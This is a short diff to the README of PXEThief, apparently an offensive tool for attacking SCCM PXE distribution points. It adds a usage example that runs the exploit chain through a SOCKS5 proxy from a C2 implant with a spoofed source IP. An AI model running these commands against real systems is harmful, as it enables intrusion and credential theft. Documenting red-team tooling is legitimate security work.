@@ -76,6 +76,9 @@ Run the full exploit chain through a SOCKS5 proxy (e.g. Cobalt Strike, Sliver, M
 # Target a specific DP through a SOCKS5 proxy
 python pxethief.py 2 10.0.0.50 --proxy socks5://127.0.0.1:1080
 
+# Provide the implant's IP as source (recommended — some PXE servers require a valid ciaddr)
+python pxethief.py 2 10.0.0.50 --proxy socks5://127.0.0.1:1080 --source-ip 10.0.0.100
+
 # With proxy authentication
 python pxethief.py 2 10.0.0.50 --proxy socks5://user:pass@127.0.0.1:1080
 
